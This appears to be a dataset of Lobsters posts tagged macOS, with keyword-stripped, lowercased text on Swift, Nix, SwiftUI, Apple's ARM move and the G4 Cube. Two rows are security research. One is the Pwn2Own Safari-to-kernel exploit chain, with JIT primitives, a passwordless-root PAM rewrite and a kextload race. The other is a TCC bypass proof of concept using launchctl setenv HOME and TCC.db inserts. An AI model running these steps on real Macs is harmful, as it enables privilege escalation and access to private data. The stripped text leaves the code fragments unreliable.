30,Lobsters,mac,Apple macOS,"Porting Redux Architecture to Swift (Well, for a Toy macOS App Anyway)",https://medium.com/insertgif/porting-redux-architecture-to-swift-well-for-a-toy-macos-app-anyway-ed61bad0395c,porting redux architecture swift well toy macos app anyway,porting redux architecture swift well toy macos app anyway insertgif store action testable debuggable easy understand easy reason store action store action app easily mutate store store action swift insertgif grand central dispatch grand central dispatch subscription higherorder reducer insertgif spectacle insertgif twitter producthunt originate,porting redux architecture swift well toy macos app anyway boy medium back day let sit rocking chair install modperl movabletype put something internet uppercased internet back liked walked told get back talking software architecture insertgifsoftware architecture exciting topic nobody else ever pontificated one nicer experience programming last year writing react component using redux unfamiliar web development talking much react redux little tutorial help know store action goal architect toy app testable debuggable easy understand easy reason idea separating store set action whatever word may mean declarative userinterface description html jsx cocoa view view controller rooted older idea separating data presentation one another behind cascading style sheet microsoft powerpoint different app microsoft word last one real making sure still paying attention scan header image blog post people critical reading skill way get pandemicstores actionswe define store location canonical representation data true know true current point time great definition try hard definition specific tell lielet say writing gui component show bank account part new bank account app store app would containall transaction renderedthe computed account balance iterate list transaction time instead n ya knowthe user avatar scroll page scrolled cover valuable information client wanted thought would spiffy app littlein kingdom javascript would represent store giant usually immutable object array string float object would want exact decimal banking app would look javascript work would sigh resign float action concrete object encode event relevant store either creating new version store requiring information store definition meant wideencompassing generic constitutes action really depends business logic patience write kinda boilerplatey code store action macos app might button clicka menu item clickthe user resized application windowa keypress happeneda keypress another app happenedan thread monitoring http request completed another threadmacos restartthe computer firebut promise something want mutate store must take place action first user want withdraw money bank balance app must first encode action action type withdrawal amount description buy new airpod old one fell chewing user uploads new avatar must make action type avataruploaded buffer containing jpeg data good implementation architecture macos application make difficult view view controller violate promise say app easily mutate store application scale include component data dependency becomes harder reason one nice aspect storeandactions architecture cheerfully named redux architecture get click link make change store explicit first change must encoded action function might call reducer must patternmatch stream action create new storestore action swiftif programmed io macos might degree recognize store another name core data managed object context le analogous store instead represented object graph encoding n n relationship giving u way project insert update delete node graph true would want unless good reason use core data application especially looking build team developer scale something approaching fancy macos app cost app storehowever let say want build toy app quickly something fun hacked together weekend yet still completely suck managing data perhaps encode store immutable object using swift struct integer also great way store decimal huh want design withdrawal first action might look like represent action using swift enum need fold stream action creating new version store along way redux represents part codebase take action produce new version immutable store reducer borrow terminology even though diction esoteric need let assume writing multiple reducer time like structure new feature ticket insertgif new reducer use protocol unify type level protocol would call interface language term come objectivec objectivec different objectivec like differentnote using swift value type structs first copy store nextstore update field new store returning common reducer code go ahead give helper make easier reason need inout keyword mutate new cloned store swift better immutable record update syntax would probably herethis banking code trustgrand central dispatch grand central dispatch write layer architecture construct store run reducer central location action dispatched handled imaginatively call dispatch view controller hook nsbutton dispatch every time user click withdraw button withdrawal action occurs real banking app would probably also want enter routing account number place withdrawing fun show blithely ignore aspect realworld bankingsome kinda cool immediate benefit get store action even extremely unrealistic example app business logic life reducer eminently testable need construct cocoa view run unit test reducer need mock storea great way debug app print action dispatch place xcode breakpoint possible external stimulus outside world pas time something unexpected happens able trace exact action caused ita common request product manager boss alike implement user analytics user click button user coming funnel user giving u information andor money write track reducer convert user behavior google analytics segment event making remote call event come fire forget minute form event sourcing friend sönke point outas app grows becoming unruly moody want refactor feature adage write code easy delete believe reducer written way satisfies rule thumb drop action reducer use compiler list compiler error find usesites imagine written view controller directly read modified array transaction balance would audit location user action led mutation would also pull business logic entangled view codesubscriptionswith withdrawal feature place would like render screen app contains list transaction account balance user avatar javascript react component update automatically dependency store among change benefit componentized user interface cocoa still benefit thinking oneway dataflow store presentation data storedispatch already single place action flow take advantage architectural watering hole use invoke subscription first let u model subscription callable object c would call functor object hear saying computer remind c escaping keyword mark closure later use constrains kind closure passed parameter help prevent reference cycle life escaping cycle construct ourselvesas subscription come store array action occurs iterate array invoke subscription small wrinkle memoize projection store avoid unnecessary ui updatesthis work breaking subscription two map action like mapstatetoprops redux encourage view controller construct equatable object containing subset information store projection need action need fire time action occursin general strike central weakness storeandactions architecture difficult write performant app certain highfrequency action encoded object passed every reducer however toy app suffices fine also imagine app certain part app flee normal architecture manage state squeeze extra framesit remains implement subscriber generic variable exists know kind type view controller want represent state know need equatable implement inequality checknow use subscription reactively update cocoa view oh boy view controller easy writethis completes core loop architecture change happens user click withdraw one view controllerthe change packaged actiona reducer several handle action creates new storesubscribers invoked new storea second view controller subscribed store update viewsone last thing though multiple reducer higherorder reducersthis title book programming would sell bunch copy even though nobody would able understand alternate universe paid content make internet suppose universe need reducer multiplex action many reducer despite fancy title simple write could keep going bank app think would neat show actual list reducer look like insertgif give hint feature ticket wanted implement release app action shoutout opensource spectacle app wayeven toy app already kind complicated might posit writing user interface essentially hobby worry tiny detailsthat allgo check insertgif already also twitter producthunt keep updating long remember insertgif made love nyc proud alumnus originate r laboratory hope much fun reading individually creating gist medium sevenyear old product support syntax highlighting code block
31,Lobsters,mac,Apple macOS,A Nix overlay for Emacs 27 with the 'emacs-mac' patches,https://cmacr.ae/post/2020-08-12-a-nix-overlay-for-emacs-27-mac/,nix overlay emacs emacsmac patch,updated release emacs nix overlay emacsmac,update official emacsmacport package updated nixpkgs master branch hit nixpkgsunstable channel soon recent release emacs figured share nix overlay using build emacsmac patch emacs come great performance improvement including native json support make really slick experience lspmode top really nice mitsuharu yamamoto patch enhance experience macos thing play lot nicer emacs superemacsmacportoverrideattrs rec version macportversion emacsname emacs version src builtinsfetchurl url http mirrorkoddosnetgnuemacs emacsname tarxz macportsrc builtinsfetchurl url ftp ftpmathschibauacjpemacs emacsname mac macportversion targz patch docheck false installtargets tag install buildinputs obuildinputs superjansson configureflags oconfigureflags withjson moment test nt passing need pas docheck false nt experienced issue yet
32,Lobsters,mac,Apple macOS,The Promise vs Reality of SwiftUI Multiplatform,https://write.as/angelo/the-promise-vs-reality-of-swiftui-multiplatform,promise v reality swiftui multiplatform,last week post tweeted letdown swiftui illustrated broken button reality multiplatform via r,happy august friend update last week post swiftui app writefreely work progressed pretty well shared code last week point got preliminary ui display list post filter collection tapping post load editor make change title content iphone ipad also new post button create new draft iphone ipad well pull chair let chat little bit gap promise reality multiplatform swiftui apps working post tweeted managed flesh key ui feature app across iphone ipad mac day thanks swiftui live preview xcode show view look like next code update realtime code stated building native app speed iteration ever encountered building web looking html cs looking react latest iteration look like far iphone ipad installed macos aka big sur beta able build mac app compare way final ui plenty work still done including replacing unusual picker view selecting collection proper sidebar adapting spacing little better mac app ca nt preview anything mac target even xcode upgrade machine macos beta one thing helpful moving quickly swiftui declarative nature let specify semantics element placement view letting framework figure mean iphone v ipad v mac great example focus developer experience dx toolbaritemplacement api let semantically state particular item add toolbar primaryaction status element used texteditor view place post status badge status area publish button primaryaction area see screenshots shared element placed differently depending whether shown iphone ipad mac nt write single line code customize difference letdown swiftui illustrated broken button life swiftui rose newdraft feature nt quite working fully yet building iphone ipad version app tapping newdraft button list post work beautifully slide new draft list open text editor next great essay thrilled working end workday friday finished installing big sur beta mac morning excited see everything looked worked mac app expected little ui refinement list post example need healthy dose padding otherwise figured similar experience least ipad app mostly picker replaced popup menu choose collection narrow list post tap post list load text editor ready change post status change instantly update badge toolbar post list tried create new draft mac clicking newdraft button appears interestingly enough next poststatus badge screenshot nothing thing error thrown view drawn nothing reality multiplatform suppose nt use word letdown multiplatform panacea reality app expects different thing iphone ipad mac issue facing newdraft button nt failing swiftui paradigm mac app treat navigation v button v instantiating new window different iphone nt structured thing way framework expects fine need spend little time adapting mac client would liked got say despite couple little issue need fix really impressed much worked right box extra work part nativeapp development may yet happen pace web development closer ever enter email subscribe update also subscribe via r follow angelo writeas mastodon
33,Lobsters,mac,Apple macOS,Compromising the macOS Kernel through Safari by Chaining Six Vulnerabilities,https://github.com/sslab-gatech/pwn2own2020,compromising macos kernel safari chaining six vulnerability,compromising macos kernel safari chaining six vulnerability overview winning submission targeting apple safari kernel escalation privilege macos blackhat usa slide demo video reproduce build source technical detail remote code execution safari via incorrect sideeffect modeling operator javascriptcore dfg compiler yong wang blackhat eu talk arbitrary app launching safari via symbolic link didfailprovisionalload arbitrary code execution cvm core virtual machine service via heap overflow macos firsttime app protection bypass root privilege escalation cfprefsd via arbitrary file folder permission modification caused race condition kernel privilege escalation using module staging bypass race condition kextload author citation reference,compromising macos kernel safari chaining six vulnerability overview repository contains exploitation technical detail winning submission targeting apple safari kernel escalation privilege macos information also check blackhat usa slide repository also includes demo video succesful exploitation reproduce run http server using exploit folder httpserver access website attacker server ip safari http attackerip exploithtml wait calculator usually popped ten second unlucky take time terminal kernel privilege show kernel privilege escalation disabled sip check running csrutil status command show disabled build source convenience provided compiled payload payloadjs want build note take long time build webkit part exploit chain worth noting tested building process mac o install xcode first pip install user lief make technical detail make exploit chained following six vulnerability remote code execution safari via incorrect sideeffect modeling operator javascriptcore dfg compiler javascriptcore indexed property queried operator dfg compiler assumes sideeffect free unless proxy object prototype chain intercept operation javascriptcore mark object intercept indexed property access using flag called mayhaveindexedaccessors flag explicitly marked proxy object sideeffect free let arr arrproto new proxy arr cause sideeffect however another object cause sideeffect jshtmlembedelement implement getownpropertyslot method one way trigger javascript callback ie side effect operator using embed element pdf plugin property queried embed object tag dom object try load backed plugin domsubtreemodified event handler called pdf plugin case us appendchild method body element stack trace calling sideeffect getownpropertyslot stack trace webkit pdfplugin pdfplugin webkit webframe webkitwebkitbuildreleasewebkitframeworkversionsawebkit webkit pdfplugin create webkit webframe webkitwebkitbuildreleasewebkitframeworkversionsawebkit webkit webpage createplugin webkit webframe webcore htmlpluginelement webkit plugin parameter const wtf string webkitwebkitbuildreleasewebkitframeworkversionsawebkit webkit webframeloaderclient createplugin webcore intsize const webcore htmlpluginelement wtf url const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf string const bool webkitwebkitbuildreleasewebkitframeworkversionsawebkit webcore subframeloader loadplugin webcore htmlpluginimageelement wtf url const wtf string const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const bool webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore subframeloader requestobject webcore htmlpluginimageelement wtf string const wtf atomstring const wtf string const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlpluginimageelement requestobject wtf string const wtf string const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const wtf vector wtf string wtf crashonoverflow wtf fastmalloc const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlembedelement updatewidget webcore createplugins webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore frameview updateembeddedobject webcore renderembeddedobject webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore frameview updateembeddedobjects webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore frameview updateembeddedobjectstimerfired webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore document updatelayoutignorependingstylesheets webcore document runpostlayouttasks webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlpluginelement renderwidgetloadingplugin const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlembedelement renderwidgetloadingplugin const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore htmlpluginelement pluginwidget webcore htmlpluginelement pluginloadingpolicy const webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore pluginscriptobjectfrompluginviewbase webcore htmlpluginelement jsc jsglobalobject webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore pluginscriptobject jsc jsglobalobject webcore jshtmlelement webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore pluginelementcustomgetownpropertyslot webcore jshtmlelement jsc jsglobalobject jsc propertyname jsc propertyslot webkitwebkitbuildreleasewebcoreframeworkversionsawebcore webcore jshtmlembedelement getownpropertyslot jsc jsobject jsc jsglobalobject jsc propertyname jsc propertyslot webkitwebkitbuildreleasewebcoreframeworkversionsawebcore llintslowpathgetbyid webkitwebkitbuildreleasejavascriptcoreframeworkversionsajavascriptcore since object prototype chain marked mayhaveindexedaccessors jit assumes use operator nt transition inside eliminating array type check transition frame iframe src pdf iframe function opt arr arr arr exists arr making check proto return arr var opt arrproto documentqueryselector embed documentbodyaddeventlistener domsubtreemodified arr documentbodyremovechild embed opt leak address double value constructing addroffakeobj primitive could make arbitrary rw primitive get code execution jitcompiled javascript function getting addroffakeobj primitive convert stable addroffakeobj primitive faking object hostobj hostobjstructureid hostobjbutterfly dummy length new asdouble fakehostobj fakeobj addressof hostobj id new asjsvalue butterfly null executable padding offset unlinkedexecutable isbuiltinfunction padding offset identifier null fakeidentifier fakeobj addressof hostobj strlenorid new asdouble stringsize target hostobj stringdataptr hostobjexecutableunlinkedexecutableidentifier fakeidentifier functionprototypetostring fakehostobj function leakedstructureid native code leak structure id hostobj making fake function object fakehostobj calling functionprototypetostring name function reflects structure id value string update hostobj leaking structure id worth noting technique yong wang blackhat eu talk hostobj hostobjstructureid hostobjbutterfly dummy length new asdouble fakehostobj fakeobj addressof hostobj id leakstructureidasdouble fakehostobjstructureid butterfly fakehostobj fakehostobjbutterfly fakehostobj butterfly pointing fakehostobj use addroffakeobj primitive without triggering bug since access hostobjo jsvalue double using fakehostobj using leaked structure id attackobj addroffakeobj primitive craft object like rwobj rwobjstructureid rwobjbutterfly dummy length new asdouble fakerwobj fakeobj addressof rwobj id leakstructureidasdouble fakerwobjstructureid butterfly fakerwobj fakerwobjbutterfly dummy innerlength new asdouble fakeinnerobj fakeobj addressof rwobj innerid leakstructureidasdouble fakeinnerobjstructureid innerbutterfly fakeinnerobj fakeinnerobjbutterfly get arbitrary rw primitive using fakerwobj update fakeinnerobj butterfly pointer readwrite fromto fakeinnerobj get rce arbitrary rw primitive trigger jit compilation dummy function leak code address overwrite shellcode sometimes code address leak fails ca nt readwrite certain value fake array case try approximate reading pointer location shifting read value finally overwrite code pointer alert function dummy function code pointer call argument execute shellcode arbitrary app launching safari via symbolic link didfailprovisionalload file url safari open finder window nsworkspace selectfile infileviewerrootedatpath function accepts two parameter case safari us first parameter show containing folder specified file second parameter used instead finder launch file executable app bundle safari us second parameter confirming pointed path application bundle directory app suffix since symbolic link point application bundle directory app suffix thus safari launch application pointed symbolic link code path triggered sending didfailprovisionalload ipc message however safari create symbolic link due system call filter seatbelt sandbox use another vulnerability give root sandboxed code execution arbitrary code execution cvm core virtual machine service via heap overflow sandboxed xpc service named comapplecvmsserv ie cvmserver compiles shader various architecture part builtin opengl framework request message field set cvmserver par userspecified framework data map map data file located systemlibrarycachescomapplecvms umaps first userspecified without filter directory traversal possible make parse file created within safari sandbox file fp fopen frameworkname r header header malloc fread header itemsoffset header itemsoffset itemscount header itemscount header realloc header itemscount itemsoffset fread header itemsoffset itemscount itemcount itemsoffset fread receive underflowed length near becomes heap overflow arbitrary length payload note fread stop end specified file reached utilizing could overwrite heap object related connection could modify pointer mentioned case message input heapindex cvmsserverservicegetmemory session port size goto error xpcdictionarysetmachsend reply vmport port fastcall cvmsserverservicegetmemory xpcsession unsigned index dword port qword pool pool rax unsigned int ebx heapitem rax pthreadmutexlock serverglobals attachedservice controlled value pool attachedservice context poolptr pool pointerscount index pool pointer port index port index size pthreadmutexunlock serverglobals return port value taskself service grant client send right cvmserver task port used allocate memory execute arbitrary code process make index port searched memory library area address across process rax userinput x length machtaskself many area two integer value found xpcerrorterminationimminent public symbol satisfies condition since length larger could calculate modular inverse point since cvmserver comapplesecuritycsallowjit set could call mmap mapjit flag invoke reflective loader execute dylib file process ran code cvmserver vardbcvms writable folder char randbuf sprintf randbuf luapp clock symlink randbuf myapp create valid application myapp creating luapp symbolic link myapp returned safari sent ipc message open app two protection quarantine check openingtheappforthefirsttime check macos firsttime app protection bypass safari try execute app first time safari denies execution file attribute called comapplequarantine wait user confirmation file created webprocess attribute comapplequarantine however already bypass created folder cvmserver process webprocess user confirmation macos first creates process suspends continue process user click open button sending sigcont signal worked clicking button thus ran code continuously cvmserver creating myapp int kill sigcont root privilege escalation cfprefsd via arbitrary file folder permission modification caused race condition cfprefsd another xpc service allows user create plist file located corefoundation recheable unsandboxed process since already got unsandboxed privilege normal user ie cvmserver request create plist file target folder file sufficient permission bit allows client user write file however folder exist creates folder plist file recursively code snippet cvmserver creates folder cfprefscreatepreferencesdirectory path slice pathsplit cur slice mkdir cur errno eexist eisdir chmod cur perm chown cur clientid clientgroup else break path point userwritable directory user replace directory pointed cur replace symbolic link arbitrary filefolder since cfprefsd root privilege possible change owner folder like etcpamd changing owner etcpamd write etcpamdlogin content auth optional pampermitso auth optional pampermitso auth optional pampermitso auth required pampermitso account required pampermitso account required pampermitso password required pampermitso session required pampermitso session required pampermitso session optional pampermitso login root command give user root shell without authentication kernel privilege escalation using module staging bypass race condition kextload kextload one program perform kext kernel extension operation macos running kextload path kext folder root user load signed kext user mode prevent unsigned invalid signed kexts kextload set authenticator callback iokituser package unfortunately path kext available resource callback race condition hard prevent mitigate kextload first copy kext folder dedicated space librarystagedextensions modified even root privilege thanks sip entitlement mechanism kextload work follows execute kextload tmpakext kextload copy original kext folder librarystagedextensionstmp uuid kext kextload check sign file folder fails deletes folder otherwise copy folder librarystagedextensionstmpakext load module kextload tmpakext copy librarystagedextensionstmp uuid kext validate signature failed delete directory succeeded copy librarystagedextensionstmpakext load kext one issue kextload process terminated root privilege user worth noting aforementioned copy includes symbolic link validated later however kill kextload process validation preserve invalid kext symbolic link librarystagedextensions assume tmpakextsymlink tmp kextload tmpakext copy librarystagedextensionstmp uuid kext kill process librarystagedextensionstmp uuid kextsymlink remained execute another kextload command kextload tmp uuid kextsymlinkbkext bkext copied writable location root privilege user eg tmp uuid kext kextload tmp uuid kextsymlinkbkext copy librarystagedextensionstmp uuid kextsymlink uuid kext since symlink tmp equal tmp uuid kext copying kextload check located secure location librarystagedextensions temporarily place symbolic link tmpakext point librarystagedextensions path valid kext validation replace module binary unsigned kernel module get kernel code execution make race reliable used sandboxexec stop program file access specified suffix author citation inproceedings jin title compromising macos kernel safari chaining six vulnerability author yonghwi jin jungwon lim insu yun taesoo kim booktitle black hat usa briefing black hat usa month aug year address la vega nv reference
34,Lobsters,mac,Apple macOS,Apple Silicon Developer Transition Kit,https://www.driftingruby.com/episodes/apple-silicon-developer-transition-kit,apple silicon developer transition kit,,install homebrew sudo xcodebuild license cd mktemp git clone http githubcomrubyfiddle cd fiddle bundle install path vendorbundle bundle exec rake build sudo gem install binbash c curl fssl http rawgithubusercontentcomhomebrewinstallmasterinstallsh install ohmyzsh curl l http rawgithubcomrobbyrussellohmyzshmastertoolsinstallsh sh zsh chmod r usrlocalsharezsh install asdf ruby brew install coreutils curl git brew install asdf echo brew prefix asdf asdfsh zshrc asdf pluginadd ruby http githubcomasdfvmasdfrubygit asdf install ruby
35,Lobsters,mac,Apple macOS,"Apple, ARM, and What It Means",https://www.ifixit.com/News/42949/apple-arm-and-what-it-means,apple arm mean,htomariflickr note syonyk project blog apple transition arm possibility apple moving arm processor apple modern phone processor started giving intel offering solid competitor really happened arm huh instruction set architecture powerpc powerpc intel opcodes quite riscv intel amd power netbooks intel sdm arm small powerefficient cheap good enough apple arm big powerefficient intel stuck broken microarchitecture process slipped yet broken term security netburst sgx enclave terminal faultforeshadow apple arm advantage security processor shipping carryon luggage roughly nowhere arm emulation rosetta provide integrated emulation virtualization goodbye native window performance mikrotik winbox software ecosystem yay raspberry pi raspberry pi raspberry pi jetson nano intel future moore law iphone review,photo htomariflickr note guest post russell graf writes computer project syonyk project blog edited version post apple transition arm found interesting view necessarily represent ifixit past year apple mac run intel processor using architecture competing pc meanwhile apple used arm processor mobile device ever since first iphone apple often seemed stymied intel slower pace innovation compared large stride mobile power year people discussing possibility apple moving arm processor desktop laptop reinvention read like something open question sure thing ever since apple modern phone processor started giving intel offering solid competitor really happened apple use custombuilt arm processor power macbooks point probably imacs mac pro lot people seem confused really mean know way around deep processor weed interesting ton uninformed garbage internet usual offer attempt clarify thing arm huh apple third major instruction set architecture isa transition history moved powerpc powerpc intel arm make pretty much consumer hardware company regularly change processor architecture certainly largest pull consistently instruction set nearly lowest level language processor speaks defines opcodes execute gut processor quite throughout history computing adding two number loading value memory deciding instruction execute next talking external hardware defined isa modern world consumer computing two matter though arm sorry riscv yet recently division simple processor intel amd ran desktop laptop server arm processor ran phone tablet printer everything else except loon like insisted reason making little arm computer function desktop thing worked anymore intel amd power decade king performance hill chip intel amd within rounding implementation pentium core athlon xeon powerhouse run office application run game run giant datacenters run internet fast powerful intel king though amd made proper nuisance regular basis fact extension probably running developed amd licensed intel powersipping atom processor netbooks massive xeons opterons data center covered default long desktop server people even think isa year old introduced accumulated lot cruft baggage year instruction maddeningly complex sort weird corner nasty gotchas gotten worse time mmx sse vmx tsx sgx txt smm stm either idea shuddering bit internally add go read intel sdm fun bored enjoyable also pretty darn complicated arm small powerefficient cheap historically arm architecture lowerpower far cheaper powerefficient alternative set fairly small cheap make powerefficient focused blazingfast performance usually good enough result ended everything desktop laptop last year two arm chip started firing solid cannon blast across bow intel xeon chip datacenter care raw singlethreaded performance care awful lot total throughput power efficiency arm server chip properly impressive le money xeon computing power fewer watt bad arm chip made way laptop desktop threat flagship performance intel apple occasion totally insane interesting way apple arm big powerefficient fast company license arm reference core etc attach desired peripheral resulting arm chip run fast company arm chip core clock rate company proper license engineering staff build totally custom arm core apple one company starting processor iphone used custom processor implementation arm processor sure reference arm processor implementation first fairly impressive time clearly phone chip meant save power run cool apple got crazy iphone probably faster anything else house term singlethreaded mere watt apple quietly iterating custom arm core created something properly barely anyone noticing meantime yeah review score got impressive year yeah modern android device stomped iphone anything massively phone threaten desktop laptop laptop far thermal capacity power offer one apple chip phone iphone battery working new macbook pro battery making time larger go screen good bit power throw computing plug computer well power problem interesting also intel found stuck intel stuck broken microarchitecture kept intel last year none surprise might notice seem produce strikingly similar processor every year sometimes month intel stuck process year plan slipped yet microarchitecture fundamentally broken term security worse fully understand chip anymore yes intel iterating releasing improvement okay made last two everyone else leapfrogged intel used unquestioned lead rest tech industry building chip showed intel chip post netburst used le power gave performance anything else solid chip performed well worth money case lost lead lost lead previous chip getting slower age might heard meltdown spectre camel nose laundry list issue recently discovered flaw microcode update software recompilation kernel workarounds workarounds slow processor haswell processor today run code slowly came whoop finally intel reason chip anymore seem unable fully understand chip know know quite regularly microarchitectural vulnerability come rip open secure sgx worst terminal faultforeshadow fix cache enclave transition hit processing speed dealbreaker point intel know problem told would want chained intel anymore good reason amd caught apple move one thirdparty vendor another pulling interesting apple arm advantage custombuilt arm chip give apple better control stack translate rather nicely better user experience least user apple able deliver performance le bargain able integrate stuff chip even power saving need separate security processor build main processor die stuck dealing whatever integrated gpu abomination intel dumped generation design chip need hardware acceleration stuff care yes know intel bad used sincerely doubt apple happy integrated gpus fewer chip also mean smaller generally mean le power consumption better performance important ever apple literally sitting limit much battery laptop claim laptop disclaimer might ask wrong battery warrant disclaimer saying actually le lot shipping carryon luggage regulation use usually phrased le apple explicitly clear laptop le advertise equal usps shipping ups something say battery ship battery essentially declare hazardous material customerfriendly scene apple literally put battery laptop expect ship inexpensively let people travel easily way increase runtime reduce power use apple arm chip almost certainly use le power intel chip work apple might keeping tradition use custom chip offer smaller lighter laptop battery nobody else touch either way bold move set apart rest industry stuck intel longer microsoft arm ambition gone roughly nowhere linuxonly hardware big seller outside chromebooks apple also gain lot able put stuff io device laptop think machine learning accelerator neural network engine speech recognition gap iphone macbook pro ought narrow significantly might even see return laptop builtin cellular modem arm emulation sticking point apple switching arm first foremost current mac based happens existing software switching arm mean software work without translation turn apple massive amount experience exactly sort thing made binary run fine powerpc made powerpc binary run acceptably rosetta provide integrated emulation emulating hard especially want fast lot work time jit space thing like javascript apple emulation expect jit engine used infrequently real performance come binary binary source code get turned arm binary let figure weirder feature like flag register updated every instruction needed ignored one could also bit work figure arm rather relaxed memory model compared cause problem build barrier easy certainly type thing apple done sound like rosetta continue trend would interesting though think apple might pull would going native library call recompiling program know code going call apple library function got bit creative emulated software could jump emulated application code native library code would gain lot performance back thing apple library lot would native performance virtualization goodbye native window performance next question least subset user virtual machine well arm support virtualization want run linux vm run arm linux vm need application say window interesting watch fully expect solution year ago ran window powerpc hardware know sort performance get full system emulation arm normally thing gone way emulate slow arm system fast machine performance great good enough going way though nobody really tried never really fast arm chip mess course apple chip faster comparable intel chip spend time emulation maybe come even ahead hoping run weird utility mikrotik winbox come mind sort thing run sure good enough solution maybe light fire microsoft fix arm version window emulator game probably sorry software ecosystem yay though really excited something almost nobody else care software ecosystem going get fixed fast playing arm desktop pi raspberry pi raspberry pi jetson nano swell interest use raspberry pi armbased chromebooks similar device made living arm tolerable daytoday livable stuff though software build randomly fail clearly little development polishing end thing like signal building arm ancient dependency nested inside node dependency know mean apple moving highend arm space expect fast great news light arm system even personally macbook intel future leave intel depends bit good apple soon intel get back track intel iterates quickly get process working fix underlying microarchitecture properly instead using university r dqa lab good decade back forth apple team excellent intel well used excellent least certainly got resource throw crash headlong brick wall end moore law getting creative ideally way leak secret going important could end something like state phone anandtech iphone review benchmark latest flagship web performance top go apple apple previous generation apple generation big gap rest pack yes mention iphone desktop grade chip term spec benchmark performance could laptopdesktop market look bad probably possibility really depends apple chip designer waiting wing someone finally said watt play apple moving away intel data center working arm option cheaper buy cheaper run faster bargain intel might hard hill may make back
36,Lobsters,mac,Apple macOS,CVE-2020–9934: Bypassing TCC,https://objective-see.com/blog/blog_0x4C.html,bypassing tcc,matt shockley personal site background article thus application gain write access database give entitlement also without ever prompting user bug ghidra stack exchange post thus could set environment variable point directory control restart daemon directly modify database give every entitlement available without ever prompting end user proof concept available github timeline,bypassing tcc unauthorized access sensitive user data matt shockley july guest blog post security researcher matt shockley describes lovely security vulnerability uncovered macos bug allowed complete bypass tcc draconian entitlement check without writing single line code writeup originally posted personal site mahalo sharing matt research tool writing supported friend objectivesee background transparency consent control tcc framework apple subsystem denies installed application access sensitive user data without explicit permission user generally form popup message tcc prompt opening spotify first time tcc also run io bug restricted o x variant learn tcc work especially catalina recommend reading article application attempt access file directory protected tcc without user authorization file operation fail tcc store userlevel entitlement database disk homelibraryapplication supportcomappletcctccdb apple us dedicated daemon tccd loggedin user one system level daemon handle tcc request daemon sit idle receive access request o application attempting access protected data listing currently running tcc daemon daemon receives request first check tcc database see user either allowed denied access requested data application tcc us previous decision otherwise prompt user choose whether allow application access thus application gain write access tcc database give tcc entitlement also without ever prompting user bug obviously able write directly database completely defeat purpose tcc apple protects database tcc system integrity protection sip even program running root modify database unless comappleprivatetccmanager comapplerootlessstoragetcc entitlement however database still technically owned readablewriteable currently running user long find program entitlement control database tcc database permission since tcc daemon directly responsible reading writing tcc database prime candidate tccd entitlement immediately opening tcc daemon ghidra looking code related handling database operation noticed something seem right ghidra decompiler view database opening code essentially tcc daemon attempt open database program try directly open create already existing database homelibraryapplication supportcomappletcctccdb seems inconspicuous first becomes interesting realize control location tcc daemon read writes control home environment variable contains tricking tcc use nonsip protected directory database initially dismissed fun trick actual tcc daemon running via launchd completely ignores database daemon o communicates authorization event however day later stumbled across stack exchange post realized since tcc daemon running via launchd within current domain could also control environment variable passed launched thus could set home environment variable launchctl point directory control restart tcc daemon directly modify tcc database give every tcc entitlement available without ever prompting end user actually modify sipprotected tcc database bug also added benefit completely resetting tcc previous state home unset launchctl daemon restarted proof concept poc bug actually pretty simple requires code written reset database case cheating tccutil reset mimic tcc directory structure library mkdir p tmptccbypasslibraryapplication supportcomappletcc cd new directory cd tmptccbypasslibraryapplication supportcomappletcc set launchd home temporary directory launchctl setenv home tmptccbypass restart tcc daemon launchctl stop comappletccd launchctl start comappletccd print content tcc database give terminal access document tccdb dump tccdb insert access value ktccservicesystempolicydocumentsfolder comappleterminal null null unused null null list document directory without prompting end user l document also full swift writeup available github swift poc example output timeline feb issue reported apple product security team feb apple review report begin investigation issue apr apple confirms bug fixed future update jul apple release patch bug security update
37,Lobsters,mac,Apple macOS,"20 Years Ago, Steve Jobs Built Apple's G4 Cube. It Bombed",https://www.wired.com/story/20-years-ago-steve-jobs-built-the-coolest-computer-ever-it-bombed/,year ago steve job built apple cube bombed,flaw would shut fewer unit talk july article excerpt,admitted gorgeous question earlier conversation drawn apple product matrix four square representing laptop desktop high low end since returning apple filled quadrant imac power mac ibook powerbook cube violated wisdom product plan power feature highend power mac like slot huge storage way expensive lowend imac even spent necessary separate display required cube owner knowing risking ire asked going buy job miss beat easy said ton people pro every designer going buy one justification violating matrix theory realized incredible opportunity make something middle sort love child truly breakthrough said implicit message great people would alter buying pattern purchase onethat happen one thing price time bought display almost three time price imac even powermacs large people spend art budget computersthat issue cube plastic hard manufacture people reported flaw air cooling problem left sheet paper top device would shut prevent overheating button stray wave hand would send machine action like notin case cube failed push button computerbuying public job told would sell million apple sold fewer unit apotheosis apple design also apex apple hubris listening tape struck much job drunk elixir aesthetic really want put hole thing put button job asked justifying lack power switch look energy put slot drive tray want ruin put button something else job cube speaks failure successful leader clear cube brick quick cut loss move onin talk oxford apple ceo tim cook talked cube described spectacular commercial failure first day almost job reaction bad sale figure showed quickly became necessary could abandon even product dear heart steve everyone known life cook said oxford could avid proponent position within minute day new information came would think never ever thought think tape prove happy birthday steve job digital love childtime travelmy july newsweek article cube came sidebar excerpt interview steve job
